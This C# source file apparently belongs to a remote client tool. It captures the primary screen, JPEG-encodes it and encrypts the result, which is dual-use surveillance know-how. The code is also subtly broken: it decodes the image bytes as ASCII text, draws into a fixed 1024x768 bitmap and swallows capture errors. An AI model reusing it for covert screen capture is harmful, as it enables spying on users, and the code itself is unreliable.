using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ClientNet.Config;

namespace ClientNet.Tools
{
    public class MstrScrn
    {
        public string EncBit()
        {
            SecTool crys = new SecTool();
            if (ClientSettings.AssignedKeys)
            {
                return crys.CustomEncrypt(Encoding.ASCII.GetString(GetBits(ScrnToBtmp())));
            }
            else
            {
                return crys.DefaultEncrypt(Encoding.ASCII.GetString(GetBits(ScrnToBtmp())));
            }
        }

        private Bitmap ScrnToBtmp()
        {
            try
            {
                Bitmap capB = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);
                Rectangle capR = Screen.AllScreens[0].Bounds;
                Graphics caprG = Graphics.FromImage(capB);
                caprG.CopyFromScreen(capR.Left, capR.Top, 0, 0, capR.Size);
                return capB;
            }
            catch (Exception ex)
            {

                Debug.WriteLine("ERROR DURING CPTR");
            }
            return null;
        }
        private byte[] GetBits(Bitmap pic)
        {
            using (var stream = new MemoryStream())
            {
                pic.Save(stream, ImageFormat.Jpeg);
                return stream.ToArray();
            }
        }
    }
}
